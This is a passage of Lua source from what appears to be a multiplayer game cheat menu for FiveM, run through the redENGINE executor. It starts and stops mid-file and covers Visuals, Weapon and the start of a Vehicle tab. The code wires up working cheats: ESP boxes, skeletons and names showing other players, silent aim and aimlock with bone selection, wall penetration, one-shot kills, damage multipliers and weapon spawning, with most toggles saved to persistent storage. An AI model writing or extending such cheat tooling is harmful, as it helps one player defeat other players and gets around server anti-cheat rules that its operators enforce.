                if checkbox('Opacity Player', 0.510, 0.61, ZM_M1000.opplayer) then
                    ZM_M1000.opplayer = not ZM_M1000.opplayer
                end
                if checkbox('Roll Infinity', 0.510, 0.635, ZM_M1000.rollinfinity) then
                    ZM_M1000.rollinfinity = not ZM_M1000.rollinfinity
                    local numberrollinfinity = ZM_M1000.rollinfinity
                        if saveconfig == true then
                            if numberrollinfinity == nil or numberrollinfinity == false then
                                SetResourceKvp("numberrollinfinity", "nil")
                            else
                                SetResourceKvp("numberrollinfinity", numberrollinfinity)
                            end
                        else
                            return false
                        end
                end

                if checkbox('No Ragdoll', 0.510, 0.66, ZM_M1000.nrgl) then
                    ZM_M1000.nrgl = not ZM_M1000.nrgl
                end

                if checkbox('Jump', 0.510, 0.685, ZM_M1000.jp) then
                    ZM_M1000.jp = not ZM_M1000.jp
                end

                if checkbox('Freecam', 0.618, 0.337, ZM_M1000.fcra) then
                    ZM_M1000.fcra = not ZM_M1000.fcra
                end

                if button('['..freecambind["BindingTouch"].. "]", 0.68, 0.337) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        freecambind["BindingTouch"] = BindingTouch
                        freecambind["Value"] = value
                    end)
                end

                button("Freecam Fov", 0.630, 0.375, true)
                slider2(0.643, 0.402, 0.08, "freecamfov", 6)

                button("Freecam Speed", 0.630, 0.43, true)
                slider2(0.643, 0.46, 0.08, "freecamspeed", 20)

                button("Freecam Sensibility", 0.630, 0.49, true)
                slider2(0.643, 0.522, 0.08, "freecamsensi", 20)

                button("Opacity Player", 0.630, 0.55, true)
                slider2(0.643, 0.575, 0.08, "opacityplayer", 255)


                if mouseInBounds(New.x + 0.48, New.y + 0.603, 0.03, 0.03) and not ZM_M1000.opplayer then
                    local x, y = Winnie_GetNuiCursorPosition()
                    local screenX, screenY = Winnie_GetActiveScreenResolution()
                    local cursorX, cursorY = x / screenX, y / screenY
                    Winnie_DrawText("[Active checkbox for use Opacity]", cursorX - 0.045, cursorY, false, 0.25, false, 255, 255, 255, 190)
                end

                if not ZM_M1000.opplayer then
                    Winnie_DrawText("[?]", New.x + 0.48, New.y  + 0.603, true, 0.26, false, 252, 244, 3, 255)
                end

            end

            if taberino == 'Visuals' then

                -- Winnie_DrawSprite('pd', 'efafaefaefeazefezaf', New.x + 0.66, New.y + 0.55, 0.10, 0.10 * 1.8, 0.0, 255, 255, 255, New.opacity) winnie le pd

                local visual_scroll = 0.34 + New.scroll2
                local scrollslider2 = New.scrolls2
                local menu_position, menu_position_y = New.x, New.y
                redENGINE.DrawImage(ouioui, New.x + 0.665, New.y + 0.55, 0.09, 0.17); -- ligne 7727
                if mouseInBounds(0.4 + menu_position, 0.30 + menu_position_y, 0.17, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and visual_scroll >= 0.175 then
                        New.scroll2 = New.scroll2 - 0.015
                        New.scrolls2 = New.scrolls2 - 17
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and visual_scroll <= 0.325 then
                        New.scroll2 = New.scroll2 + 0.015
                        New.scrolls2 = New.scrolls2 + 17
                    end
                end

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Boxes', 0.400, visual_scroll, ZM_M1000.boxes) then
                        ZM_M1000.boxes = not ZM_M1000.boxes

                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Skeleton', 0.400, visual_scroll, ZM_M1000.skelt) then
                        ZM_M1000.skelt = not ZM_M1000.skelt
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Player Name', 0.400, visual_scroll, ZM_M1000.plname) then
                        ZM_M1000.plname = not ZM_M1000.plname
                        local numberplname = ZM_M1000.plname
                        if saveconfig == true then
                            if numberplname == nil or numberplname == false then
                                SetResourceKvp("numberplname", "nil")
                            else
                                SetResourceKvp("numberplname", numberplname)
                            end
                        else
                            return false
                        end
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Thermal Vision', 0.400, visual_scroll, ZM_M1000.tvision) then
                        ZM_M1000.tvision = not ZM_M1000.tvision
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Night Vision', 0.400, visual_scroll, ZM_M1000.nivision) then
                        ZM_M1000.nivision = not ZM_M1000.nivision
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('World Color', 0.400, visual_scroll, ZM_M1000.wcolor) then
                        ZM_M1000.wcolor = not ZM_M1000.wcolor
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll >= 0.34 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Line', 0.400, visual_scroll, ZM_M1000.line) then
                        ZM_M1000.line = not ZM_M1000.line
                        local numberline = ZM_M1000.line
                        if saveconfig == true then
                            if numberline == nil or numberline == false then
                                SetResourceKvp("numberline", "nil")
                            else
                                SetResourceKvp("numberline", numberline)
                            end
                        else
                            return false
                        end
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll <= 0.49 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('Blips', 0.400, visual_scroll, ZM_M1000.bllplp) then
                        ZM_M1000.bllplp = not ZM_M1000.bllplp
                    end
                end visual_scroll = visual_scroll + 0.025

                if visual_scroll <= 0.49 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('No Water', 0.400, visual_scroll, ZM_M1000.nwater) then
                        ZM_M1000.nwater = not ZM_M1000.nwater

                    end
                end visual_scroll = visual_scroll + 0.025


                if visual_scroll <= 0.49 and New.scroll2 <= 0.7 - 0.015 then
                    if checkbox('No Props', 0.400, visual_scroll, ZM_M1000.nprops) then
                        ZM_M1000.nprops = not ZM_M1000.nprops
                        local numbernoprops = ZM_M1000.nprops
                        if saveconfig == true then
                            if numbernoprops == nil or numbernoprops == false then
                                SetResourceKvp("numbernoprops", "nil")
                            else
                                SetResourceKvp("numbernoprops", numbernoprops)
                            end
                        else
                            return false
                        end
                    end
                end visual_scroll = visual_scroll + 0.025


                if checkbox('Heal Bar', 0.510, 0.34, ZM_M1000.hbar) then
                    ZM_M1000.hbar = not ZM_M1000.hbar
                    local numberhbar = ZM_M1000.hbar
                        if saveconfig == true then
                            if numberhbar == nil or numberhbar == false then
                                SetResourceKvp("numberhbar", "nil")
                            else
                                SetResourceKvp("numberhbar", numberhbar)
                            end
                        else
                            return false
                        end
                end

                if checkbox('Armor Bar', 0.510, 0.365, ZM_M1000.abar) then
                    ZM_M1000.abar = not ZM_M1000.abar
                    local numberabar = ZM_M1000.abar
                    if saveconfig == true then
                        if numberabar == nil or numberabar == false then
                            SetResourceKvp("numberabar", "nil")
                        else
                            SetResourceKvp("numberabar", numberabar)
                        end
                    else
                        return false
                    end
                end


                if checkbox('Remove Fog', 0.510, 0.390, ZM_M1000.rmvfog) then
                    ZM_M1000.rmvfog = not ZM_M1000.rmvfog
                    local numberfog = ZM_M1000.rmvfog
                    if saveconfig == true then
                        if numberfog == nil or numberfog == false then
                            SetResourceKvp("numberfog", "nil")
                        else
                            SetResourceKvp("numberfog", numberfog)
                        end
                    else
                        return false
                    end
                end

                if checkbox('Crosshair', 0.510, 0.415, ZM_M1000.chair) then
                    ZM_M1000.chair = not ZM_M1000.chair
                    local numberhair = ZM_M1000.chair
                    if saveconfig == true then
                        if numberhair == nil or numberhair == false then
                            SetResourceKvp("numberhair", "nil")
                        else
                            SetResourceKvp("numberhair", numberhair)
                        end
                    else
                        return false
                    end
                end

                if checkbox('Force Radar', 0.510, 0.44, ZM_M1000.blps) then
                    ZM_M1000.blps = not ZM_M1000.blps
                end

                if checkbox('ESP Weapon', 0.510, 0.465, ZM_M1000.eweapon) then
                    ZM_M1000.eweapon = not ZM_M1000.eweapon
                    local numberespweapon = ZM_M1000.eweapon
                    if saveconfig == true then
                        if numberespweapon == nil or numberespweapon == false then
                            SetResourceKvp("numberespweapon", "nil")
                        else
                            SetResourceKvp("numberespweapon", numberespweapon)
                        end
                    else
                        return false
                    end
                end

                if checkbox('Clear Night', 0.510, 0.49, ZM_M1000.cnight) then
                    ZM_M1000.cnight = not ZM_M1000.cnight
                    local numberespsnight = ZM_M1000.cnight
                    if saveconfig == true then
                        if numberespsnight == nil or numberespsnight == false then
                            SetResourceKvp("numberespsnight", "nil")
                        else
                            SetResourceKvp("numberespsnight", numberespsnight)
                        end
                    else
                        return false
                    end
                end

                local visual2_scroll = 0.565 + New.scroll3
                local scrollslider3 = New.scrolls3

                if mouseInBounds(0.4 + menu_position, 0.65 + menu_position_y, 0.17, 0.30) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and visual2_scroll >= 0.37 then
                        New.scroll3 = New.scroll3 - 0.014
                        New.scrolls3 = New.scrolls3 - 15.5
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and visual2_scroll <= 0.56 then
                        New.scroll3 = New.scroll3 + 0.014
                        New.scrolls3 = New.scrolls3 + 15.5
                    end
                end

            if visual2_scroll >= 0.565 then
                if checkbox('Include Self', 0.400, visual2_scroll, ZM_M1000.icnself) then
                    ZM_M1000.icnself = not ZM_M1000.icnself

                end
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll >= 0.565 then
                if checkbox('Include Player', 0.400, visual2_scroll, ZM_M1000.icnpeds) then
                    ZM_M1000.icnpeds = not ZM_M1000.icnpeds
                end
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll >= 0.565 then
                if checkbox('Fill Box', 0.400, visual2_scroll, ZM_M1000.flbox) then
                    ZM_M1000.flbox = not ZM_M1000.flbox
                end
            end visual2_scroll = visual2_scroll + 0.03

            if visual2_scroll >= 0.565 then
                button('Color R', 0.412, visual2_scroll, false)
            end visual2_scroll = visual2_scroll + 0.02


            if visual2_scroll >= 0.565 then
                slider2(0.425, visual2_scroll - 0.00013, 0.08, "colorr", 255)
            end visual2_scroll = visual2_scroll + 0.02

            if visual2_scroll >= 0.565 then
                button('Color G', 0.412, visual2_scroll, false)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll >= 0.565 and New.scroll3 <= 0.6 - 0.015 then
                slider2(0.425, visual2_scroll - 0.0001, 0.08, "colorg", 255)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll <= 0.715 and visual2_scroll >= 0.565 then
                button('Color B', 0.412, visual2_scroll, false)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll <= 0.715 then
                slider2(0.425, visual2_scroll - 0.000005, 0.08, "colorb", 255)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll <= 0.715 then
                button('Value World Color', 0.412, visual2_scroll, false)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll <= 0.715 then
                slider2(0.425, visual2_scroll - 0.00000010, 0.08, "valueworldcolor", 1000)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll <= 0.715 then
                button('ESP Height', 0.412, visual2_scroll, false)
            end visual2_scroll = visual2_scroll + 0.025

            if visual2_scroll <= 0.71 then -- espheight 0.643 gauche
                slider2(0.425, visual2_scroll - 0.00000005, 0.08, "espheight", 10)
            end

            button("Opacity Fill Box", 0.635, 0.34, false) -- opacityfillbox
            slider2(0.648, 0.36, 0.08, "opacityfillbox", 255)

            button("Distance ESP", 0.635, 0.385, true) -- espdistance
            slider2(0.648, 0.405, 0.08, "espdistance", 3000)

            Winnie_DrawRect(New.x + 0.665, New.y + 0.6499, 0.090, 0.001, math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]),255)
            Winnie_DrawRect(New.x + 0.665, New.y + 0.4499, 0.0905, 0.001, math.floor(255 * rE_Slider["Slider_colorr_value"]),math.floor(255 * rE_Slider["Slider_colorg_value"]),math.floor(255 * rE_Slider["Slider_colorb_value"]),255)
            Winnie_DrawRect(New.x + 0.62, New.y + 0.55, 0.0005, 0.20, 255, 255, 255, 140)
            Winnie_DrawRect(New.x + 0.71, New.y + 0.55, 0.0005, 0.20, 255, 255, 255, 140)
            Winnie_DrawRect(New.x + 0.615, New.y + 0.55, 0.0008, 0.20, 0, 255, 0, 255)
            Winnie_DrawRect(New.x + 0.665, New.y + 0.66, 0.090, 0.001, 0, 0, 255, 255)
            Winnie_DrawRect(New.x + 0.38, New.y + 0.415, 0.0016, 0.18, 60, 60, 60, 255)
            Winnie_DrawRect(New.x + 0.38, New.y + 0.505 + New.scroll2, 0.0016, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
            Winnie_DrawRect(New.x + 0.38, New.y + 0.64, 0.0016, 0.17, 60, 60, 60, 255)
            Winnie_DrawRect(New.x + 0.38, New.y + 0.72 + New.scroll3 * 0.85 - 0.001, 0.0016, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
         end


            if taberino == 'Weapon' then
                local slideBar = New.slideBar
                if mouseInBounds(0.70 + New.x, 0.50 + New.y, 0.17, 0.50) then
                    if Winnie_IsDisabledControlPressed(0, 14) then
                        New.slideBar = New.slideBar - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) then
                        New.slideBar = New.slideBar + 0.015
                    elseif Winnie_IsControlPressed(0, 174) then
                        New.slideBar = New.slideBar - 0.005
                    elseif Winnie_IsControlPressed(0, 175) then
                        New.slideBar = New.slideBar + 0.005
                    end




                    if New.slideBar > 0.06 then
                        New.slideBar = 0.06
                    elseif New.slideBar <= 0.0 then
                        New.slideBar = 0.0
                    end
                end

               -- Winnie_DrawSprite('ezfezafzaefadfafaf', 'ezfezgtrhrthtrhrth', New.x + 0.85,  New.y + 0.750, 0.60, 0.60 * 1.8, 0.0, 255, 255, 255, New.opacity)
               redENGINE.DrawImage(cursopedbonertest, New.x + 0.85,  New.y + 0.50, 0.59, 0.56);








                if button('Give All', 0.415, 0.335, false) then
                    for k, v in pairs(weapons) do
                        Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(v), 250, false, false)
                    end
                    request("Give Executed!", 3000)
                end

                if button('Remove All', 0.415, 0.355, false) then
                    Winnie_RemoveAllPedWeapons(Winnie_PlayerPedId(), true)
                    request("Remove Executed!", 3000)
                end

                if button('Give Specific', 0.415, 0.375, false) then
                    local result = KeyboardInput("WEAPON_PISTOL", "WEAPON_", 50)
                    if result then
                        Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(string.upper(result)), 250, false, false)
                    end
                    request("Give Executed!", 3000)
                end

                if button('Remove Specific', 0.415, 0.395, false) then
                    local result = KeyboardInput("Which Weapon?", "", 50)
                    if result then
                        Winnie_RemoveWeaponFromPed(Winnie_PlayerPedId(), Winnie_GetHashKey(string.upper(result)))
                        request("Remove Executed!", 3000)
                    end
                end

                if button('Max Ammo', 0.415, 0.415, false) then
                    local _get = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                    Winnie_SetPedAmmo(Winnie_PlayerPedId(), _get, 254)
                    request("Max Ammo Executed!", 3000)
                end

                if button('Remove Ammo', 0.415, 0.435, false) then
                    local _get = Winnie_GetSelectedPedWeapon(Winnie_PlayerPedId())
                    Winnie_SetPedAmmo(Winnie_PlayerPedId(), _get, 0)
                    request("Remove Executed!", 3000)
                end

                if checkbox('Specific Ammo', 0.403, 0.46, ZM_M1000.speammo) then
                    ZM_M1000.speammo = not ZM_M1000.speammo
                end

                slider2(0.408, 0.49, 0.04, "specificammo", 255)

                local visual3_scroll = 0.565 + New.scroll5
                if mouseInBounds(0.4 + New.x, 0.65 + New.y, 0.17, 0.30) then
                    if Winnie_IsDisabledControlPressed(0, 14)  and visual3_scroll >= 0.37 then
                        New.scroll5 = New.scroll5 - 0.014
                        New.scrolls5 = New.scrolls5 - 15.5
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and visual3_scroll <= 0.56 then
                        New.scroll5 = New.scroll5 + 0.014
                        New.scrolls5 = New.scrolls5 + 15.5
                    end
                end




                if visual3_scroll <= 0.722 and visual3_scroll >= 0.565 then
                    button('FOV Aimbot', 0.415, visual3_scroll, false)
                end visual3_scroll = visual3_scroll + 0.025


                if visual3_scroll <= 0.722 and visual3_scroll >= 0.55 then
                    slider2(0.428, visual3_scroll, 0.08, "fovaimlock", 100)
                end visual3_scroll = visual3_scroll + 0.03

                if visual3_scroll <= 0.722 and visual3_scroll >= 0.565 then
                    if checkbox('Target Dead', 0.403, visual3_scroll, ZM_M1000.tgdead) then
                        ZM_M1000.tgdead = not ZM_M1000.tgdead
                    end
                end visual3_scroll = visual3_scroll + 0.025

                if visual3_scroll <= 0.722 and visual3_scroll >= 0.565 then
                    if checkbox('Target Ped', 0.403, visual3_scroll, ZM_M1000.tgped) then
                        ZM_M1000.tgped = not ZM_M1000.tgped
                    end
                end visual3_scroll = visual3_scroll + 0.035


                if visual3_scroll <= 0.722 and visual3_scroll >= 0.565 then
                    button('PTFX Scale', 0.415, visual3_scroll, false)
                end  visual3_scroll = visual3_scroll + 0.025


                if visual3_scroll <= 0.722 and visual3_scroll >= 0.55 then
                    slider2(0.428, visual3_scroll, 0.08, "ptfxscaleweapon", 100)
                end visual3_scroll = visual3_scroll + 0.03

                if visual3_scroll <= 0.72 and visual3_scroll >= 0.565 then
                    if checkbox('Penetrate Wall', 0.403, visual3_scroll, ZM_M1000.pwall) then
                        ZM_M1000.pwall = not ZM_M1000.pwall
                        local numberespwall = ZM_M1000.pwall
                         if saveconfig == true then
                        if numberespwall == nil or numberespwall == false then
                            SetResourceKvp("numberespwall", "nil")
                        else
                            SetResourceKvp("numberespwall", numberespwall)
                        end
                        else
                        return false
                        end
                    end
                end visual3_scroll = visual3_scroll + 0.030

                if visual3_scroll <= 0.71 and visual3_scroll >= 0.565 then
                    button('Distance Aimbot', 0.415, visual3_scroll, false)
                end visual3_scroll = visual3_scroll + 0.025

                if visual3_scroll <= 0.722 and visual3_scroll >= 0.55 then
                    slider2(0.428, visual3_scroll, 0.08, "distanceaimlock", 1000)
                end visual3_scroll = visual3_scroll + 0.03

                if visual3_scroll <= 0.722 and visual3_scroll >= 0.565 then
                    button('Damage multiplier', 0.415, visual3_scroll, false)
                end visual3_scroll = visual3_scroll + 0.025

                if visual3_scroll <= 0.722 and visual3_scroll >= 0.55 then
                    slider2(0.428, visual3_scroll, 0.08, "dmgplayer", 100)
                end visual3_scroll = visual3_scroll + 0.03

                local weaponScroll = 0.34 + New.scroll6
                local menu_position, menu_position_y = New.x, New.y

                if mouseInBounds(0.55 + menu_position, 0.45 + menu_position_y, 0.15, 0.20) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and weaponScroll >= 0.175 then
                        New.scroll6 = New.scroll6 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and weaponScroll <= 0.335 then
                        New.scroll6 = New.scroll6 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and weaponScroll >= 0.37 then
                        New.scroll6 = New.scroll6 - 0.015
                    elseif Winnie_IsControlPressed(0, 173) and weaponScroll <= 0.335 then
                        New.scroll6 = New.scroll6 + 0.015
                    end
                end


                if weaponScroll >= 0.34 then
                    if checkbox('Silent Aim', 0.510, weaponScroll, ZM_M1000.aimbot) then

                        ZM_M1000.aimbot = not ZM_M1000.aimbot
                        local numberaimbot = ZM_M1000.aimbot
                        if saveconfig == true then
                            if numberaimbot == nil or numberaimbot == false then
                                SetResourceKvp("silentaim", "nil")
                            else
                                SetResourceKvp("silentaim", numberaimbot)
                            end
                        else
                            return false
                        end

                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll >= 0.34 then
                    if checkbox('Aimlock', 0.510, weaponScroll, ZM_M1000.amlck) then
                        ZM_M1000.amlck = not ZM_M1000.amlck
                        local numberaimlock = ZM_M1000.amlck
                        if saveconfig == true then
                            if numberaimlock == nil or numberaimlock == false then
                                SetResourceKvp("aimlock", "nil")
                            else
                                SetResourceKvp("aimlock", numberaimlock)
                            end
                        else
                            return false
                        end
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll >= 0.34 then
                    if checkbox('Ammo Ilimited', 0.510, weaponScroll, ZM_M1000.infiniammo) then
                        ZM_M1000.infiniammo = not ZM_M1000.infiniammo
                        local numberesammoilimited = ZM_M1000.infiniammo
                         if saveconfig == true then
                        if numberesammoilimited == nil or numberesammoilimited == false then
                            SetResourceKvp("numberesammoilimited", "nil")
                        else
                            SetResourceKvp("numberesammoilimited", numberesammoilimited)
                        end
                        else
                        return false
                        end
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll >= 0.34 then
                    if checkbox('Rapid Fire', 0.510, weaponScroll, ZM_M1000.rpdfire) then
                        ZM_M1000.rpdfire = not ZM_M1000.rpdfire
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll >= 0.34 then
                    if checkbox('No Spread', 0.510, weaponScroll, ZM_M1000.nospread) then
                        ZM_M1000.nospread = not ZM_M1000.nospread
                        local numberspread = ZM_M1000.nospread
                        if saveconfig == true then
                            if numberspread == nil or numberspread == false then
                                SetResourceKvp("nospread", "nil")
                            else
                                SetResourceKvp("nospread", numberspread)
                            end
                        else
                            return false
                        end
                    end
                end weaponScroll = weaponScroll + 0.025
                if weaponScroll >= 0.34 then
                    if checkbox('Shoot Teleport', 0.510, weaponScroll, ZM_M1000.shootp) then
                        ZM_M1000.shootp = not ZM_M1000.shootp
                    end
                end weaponScroll = weaponScroll + 0.025
                if weaponScroll >= 0.34 then
                    if checkbox('PTFX BuIIet', 0.510, weaponScroll,ZM_M1000.ptfxbullet) then
                        ZM_M1000.ptfxbullet = not ZM_M1000.ptfxbullet
                    end
                end weaponScroll = weaponScroll + 0.025
                if weaponScroll <= 0.50 then
                    if checkbox('Shoot Vehicle', 0.510, weaponScroll, ZM_M1000.drawbullet) then
                        ZM_M1000.drawbullet = not ZM_M1000.drawbullet
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll <= 0.50 then
                    if checkbox('Anti-Headshot', 0.510, weaponScroll, ZM_M1000.antihd) then
                        ZM_M1000.antihd = not ZM_M1000.antihd
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll <= 0.50 then
                    if checkbox('Hit Sound', 0.510, weaponScroll, ZM_M1000.hitmarker) then
                        ZM_M1000.hitmarker = not ZM_M1000.hitmarker
                        local numbershitmaler = ZM_M1000.hitmarker
                        if saveconfig == true then
                            if numbershitmaler == nil or numbershitmaler == false then
                                SetResourceKvp("numbershitmaler", "nil")
                            else
                                SetResourceKvp("numbershitmaler", numbershitmaler)
                            end
                        else
                            return false
                        end
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll <= 0.50 then
                    if checkbox('FOV', 0.510, weaponScroll, ZM_M1000.fov) then
                        ZM_M1000.fov = not ZM_M1000.fov
                        local numberfov = ZM_M1000.fov
                        if saveconfig == true then
                            if numberfov == nil or numberfov == false then
                                SetResourceKvp("numberfov", "nil")
                            else
                                SetResourceKvp("numberfov", numberfov)
                            end
                        else
                            return false
                        end
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll <= 0.50 then
                    if checkbox('Fill FOV', 0.510, weaponScroll, ZM_M1000.fillfov) then
                        ZM_M1000.fillfov = not ZM_M1000.fillfov
                        local numberfovfill = ZM_M1000.fillfov
                        if saveconfig == true then
                            if numberfovfill == nil or numberfovfill == false then
                                SetResourceKvp("numberfovfill", "nil")
                            else
                                SetResourceKvp("numberfovfill", numberfovfill)
                            end
                        else
                            return false
                        end
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll <= 0.50 then
                    if checkbox('Damage multiplier', 0.510, weaponScroll, ZM_M1000.dmgplayer) then
                        ZM_M1000.dmgplayer = not ZM_M1000.dmgplayer
                    end
                end weaponScroll = weaponScroll + 0.025

                if weaponScroll <= 0.50 then
                    if checkbox('One shot ALL', 0.510, weaponScroll, ZM_M1000.oneshot) then
                        ZM_M1000.oneshot = not ZM_M1000.oneshot
                    end
                end

                if checkboxlock(0.85, 0.34, head) then
                    head = true
                    shoulder = false
                    shoulder2 = false
                    pelvis = false
                    feet = false
                    feet2 = false
                    kneel = false
                    kneer = false
                end

                if checkboxlock(0.87, 0.375, shoulder) then
                    shoulder = true
                    head = false
                    shoulder2 = false
                    pelvis = false
                    feet = false
                    feet2 = false
                    kneel = false
                    kneer = false
                end

                if checkboxlock(0.825, 0.379, shoulder2) then
                    shoulder2 = true
                    shoulder = false
                    pelvis = false
                    feet = false
                    feet2 = false
                    head = false
                    kneer = false
                end

                if checkboxlock(0.85, 0.50, pelvis) then
                    pelvis = true
                    head = false
                    shoulder = false
                    shoulder2 = false
                    feet = false
                    feet2 =false
                    kneel = false
                    kneer = false
                end

                if checkboxlock(0.825, 0.685, feet) then
                    feet = true
                    pelvis = false
                    head = false
                    shoulder = false
                    shoulder2 = false
                    feet2 =false
                    kneel = false
                    kneer = false
                end

                if checkboxlock(0.88, 0.69, feet2) then
                    feet2 = true
                    feet = false
                    pelvis = false
                    head = false
                    shoulder = false
                    shoulder2 = false
                    kneel = false
                    kneer = false
                end

                if checkboxlock(0.87, 0.60, kneel) then
                    kneel = true
                    feet2 = false
                    feet = false
                    pelvis = false
                    head = false
                    shoulder = false
                    shoulder2 = false
                    kneer = false
                end

                if checkboxlock(0.835, 0.60, kneer) then
                    kneer = true
                    kneel = false
                    feet2 = false
                    feet = false
                    pelvis = false
                    head = false
                    shoulder = false
                    shoulder2 = false
                end





                local arfzafagfagfagaPosition5 = 0.34
                for k, v in pairs(weaponTable.weapon5) do
                    if New.slideBar > 0.052 then
                        if button(v.button, 0.575 + slideBar, arfzafagfagfagaPosition5) then
                            Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(v.name), 250, false, false)
                        end
                        arfzafagfagfagaPosition5 = arfzafagfagfagaPosition5 + 0.020
                    end
                end

                local arfzafagfagfagaPosition4 = 0.56
                for k, v in pairs(weaponTable.weapon4) do
                    if slideBar <= 0.015 then
                        if button(v.button, 0.730 + slideBar, arfzafagfagfagaPosition4) then
                            Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(v.name), 250, false, false)
                        end
                        arfzafagfagfagaPosition4 = arfzafagfagfagaPosition4 + 0.020
                    end
                end

                local arfzafagfagfagaPosition3 = 0.34
                for k, v in pairs(weaponTable.weapon3) do
                    if slideBar <= 0.015 then
                        if button(v.button, 0.730 + slideBar, arfzafagfagfagaPosition3) then
                            Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(v.name), 250, false, false)
                        end
                        arfzafagfagfagaPosition3 = arfzafagfagfagaPosition3 + 0.020
                    end
                end

                local arfzafagfagfagaPosition2 = 0.34
                for k, v in pairs(weaponTable.weapon2) do
                    if button(v.button, 0.630 + slideBar, arfzafagfagfagaPosition2) then
                        Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(v.name), 250, false, false)
                    end
                    arfzafagfagfagaPosition2 = arfzafagfagfagaPosition2 + 0.020
                end

                local arfzafagfagfagaPosition = 0.34
                for k, v in pairs(weaponTable.arfzafagfagfaga) do
                    if button(v.button, 0.680 + slideBar, arfzafagfagfagaPosition) then
                        Winnie_GiveWeaponToPed(Winnie_PlayerPedId(), Winnie_GetHashKey(v.name), 250, false, false)
                    end
                    arfzafagfagfagaPosition = arfzafagfagfagaPosition + 0.020
               end

                Winnie_DrawRect(New.x + 0.38, New.y + 0.64, 0.0016, 0.17, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.38, New.y + 0.72 + New.scroll5 * 0.82 - 0.001, 0.0016, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

                Winnie_DrawRect(New.x + 0.48, New.y + 0.42, 0.0016, 0.17, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.48, New.y + 0.50 + New.scroll6 * 0.95 , 0.0016, 0.0080, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

                Winnie_DrawRect(New.x + 0.675, New.y + 0.71, 0.145, 0.01, 30, 30, 30, 255)
                Winnie_DrawRect(New.x + 0.644 + slideBar, New.y + 0.71, 0.087, 0.01, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
            end

            if taberino == 'Vehicle' then

                local vehicle_scroll = 0.335 + New.scroll7
                local menu_position, menu_position_y = New.x, New.y

                if mouseInBounds(0.4 + menu_position, 0.30 + menu_position_y, 0.10, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and vehicle_scroll >= 0.175 then
                        New.scroll7 = New.scroll7 - 0.015
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and vehicle_scroll <= 0.32 then
                        New.scroll7 = New.scroll7 + 0.015
                    elseif Winnie_IsControlPressed(0, 172) and vehicle_scroll >= 0.175 then
                        New.scroll7 = New.scroll7 - 0.015
